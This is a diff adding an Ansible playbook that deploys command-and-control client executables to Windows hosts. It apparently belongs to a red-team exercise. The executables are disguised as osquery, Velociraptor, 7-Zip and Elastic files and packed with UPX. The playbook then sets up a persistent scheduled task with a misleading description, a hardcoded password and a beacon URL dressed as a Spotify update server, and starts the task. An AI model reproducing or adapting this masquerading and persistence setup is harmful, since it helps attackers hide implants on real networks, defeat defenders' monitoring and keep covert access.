@@ -1,0 +1,49 @@
+---
+- name: Copy and Install C2 Files
+  hosts:
+    - t1srv
+    #- g1srv
+    #- g2srv
+    #- g3srv
+    #- g4srv
+    #- g5srv
+  gather_facts: yes
+
+  tasks:
+    - name: Copy C2Files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/redFiles/c2Clients/{{ item.name }}"
+        dest: "{{ item.dest }}"
+      loop:
+        - { name: "osquery.exe", dest: 'c:\program files\osquery\osqueryd' }
+        - { name: "configure_lang.exe", dest: 'c:\program files\7-zip\lang' }
+        - { name: "toolbox.exe", dest: 'c:\program files\velociraptor\tools' }
+        - { name: "iecleanup.exe", dest: 'c:\users\public' }
+        - { name: "beatsfix.exe", dest: 'c:\elastic' }
+
+# Compressed files with different compression with UPX - upx -1 -o configure_lang.exe configure.exe
+#
+    - name: Setup Scheduled Task for osquery.exe
+      community.windows.win_scheduled_task:
+        name: Local Monitor 
+        username: '{{ teamName }}\monitor.service'
+        logon_type: s4u
+        password: "BdZvI0vVD"
+        description: Core OS Query Monitoring Service that manages local user monitoring.
+        enabled: yes
+        actions:
+          - path: 'c:\program files\osquery\osqueryd\osquery.exe'
+            arguments: "-url https://updates.spotify.com"
+        triggers:
+        - type: daily
+          start_boundary: '2024-02-20T01:00:00'
+          repetition:
+            interval: PT15M
+        state: present
+
+    - name: Run Basic Powershell script to run scheduled task
+      ansible.windows.win_powershell:
+        script: |
+          Start-ScheduledTask -TaskName "Local Monitor"
+
+
